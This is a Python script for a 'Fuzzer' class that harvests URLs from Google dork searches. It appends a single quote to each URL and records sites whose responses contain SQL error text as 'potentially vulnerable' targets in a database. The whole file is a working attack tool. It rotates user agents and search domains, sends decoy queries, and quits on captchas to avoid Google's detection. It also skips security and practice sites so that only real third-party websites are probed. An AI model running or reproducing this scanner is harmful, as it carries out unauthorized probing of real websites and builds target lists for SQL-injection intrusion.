#!/usr/bin/env python3

from lib.dbconnection import DatabaseSession
from random import choice, randint
from time import sleep
from sys import exit
import bs4
import requests
import re

agent_url = "https://techblog.willshouse.com/2012/01/03/most-common-user-agents/"

class Fuzzer(object):

    def __init__(self, loops=5, dork_file=None, read=False):
        self.loops = int(loops)
        if dork_file:
            try:
                with open(dork_file, 'r') as f:
                    self.queries = f.readlines()
            except:
                exit("Invalid dork file!")
        elif read == True:
            pass
        else:
            exit("No dork list specified!")
        self.filters = [
                'facebook.com',
                'stackoverflow.com',
                'sqlvulnerablewebsites',
                'vulnerable',
                'hack',
                'sec4sec',
                'cybraryit',
                'sql-injection',
                'youtube'
                ]
        self.domains = ['com', 'co.uk', 'ws', 'com.au']
        self.bogus_queries = ['amazon', 'google', 'facebook', 'twitter']
        self.session = DatabaseSession()
        self.user_agents = self.get_user_agents()
        self.websession = requests.Session()
        self.websession.headers.update({'User-Agent': choice(self.user_agents)})
        self.last_domain = None

    def _reset_user_agent(self):
        self.websession.headers.update({'User-Agent': choice(self.user_agents)})

    def _skip_url(self, url):
        for item in self.filters:
            if item in url:
                return True
        return False

    def _send_bogus_query(self):
        query = choice(self.bogus_queries)
        self._send_query(query)

    def _send_query(self, query):
        suffix = self.last_domain
        pageno = randint(1,20)
        while suffix == self.last_domain:
            suffix = choice(self.domains)
            address= "https://www.google.%s/search?q=%s&start=%s" % (
                        suffix,
                        query,
                        str(pageno*10)
                )
        print("Querying %s: Page %s" % (address, pageno))
        self.last_domain = suffix
        self._reset_user_agent()
        return self.websession.get(address)


    def get_user_agents(self):
        user_agents = []
        try:
            print("Trying to load user agents...")
            response = requests.get(agent_url, timeout=10)
        except:
            print("Could not sync user agents from the internet")
            response = None
        if response:
            lines = response.content.split(b"\n")
            for line in lines:
                if b"Mozilla" in line and not b"<" in line:
                    user_agents.append(line)
            with open("user_agents", "w") as f:
                for agent in user_agents:
                    f.write("%s\n" % agent.decode('utf-8'))
            return user_agents
        else:
            try:
                with open("user_agents", "r") as f:
                    agents = f.readlines()
                for agent in agents:
                    user_agents.append(agent.strip())
                return user_agents 
            except:
                exit("Could not load any user agents")


    def run_scan(self):
        print("Starting scan. Will run %s queries" % self.loops)
        for i in range(0, self.loops):
            query = choice(self.queries)
            results = self.get_endpoints(query)
            for item in results:
                self.test_endpoint(item)
            print("Sending bogus query and sleeping additional 15 seconds")
            self._send_bogus_query()
            sleep(15)
            
    def get_endpoints(self, query):
        results = []
        page = self._send_query(query)
        if re.search('captcha', page.text.lower()):
            print("Detected captcha. We got got. Exiting")
            exit(1)
        else:
            soup = bs4.BeautifulSoup(page.text,"html.parser")
            for item in soup.find_all('h3', attrs={'class' : 'r'}):
                results.append(item.a['href'][7:])
        print("Finished page. Sleeping 15 seconds")
        sleep(15)
        return results

    def test_endpoint(self, item):
        relist = ["sql", "syntax"]
        if not self._skip_url(item):
            url = "%s'" % item.split('&')[0]
            if "http" not in url:
                url = "http://%s" % url
            fixed_url = url.replace('///', '//')
            if not self.session._target_exists_in_db(fixed_url):
                print("Testing %s" % fixed_url)
                try:
                    response = self.websession.get(fixed_url, timeout=5)
                except:
                    print("Yucky URL: %s" % fixed_url)
                    return
                for regex in relist:
                    if re.search(regex, response.text.lower()):
                        print("Potentially vulnerable: %s" % fixed_url)
                        self.session.add_target(fixed_url)
                        return
                    else:
                        continue

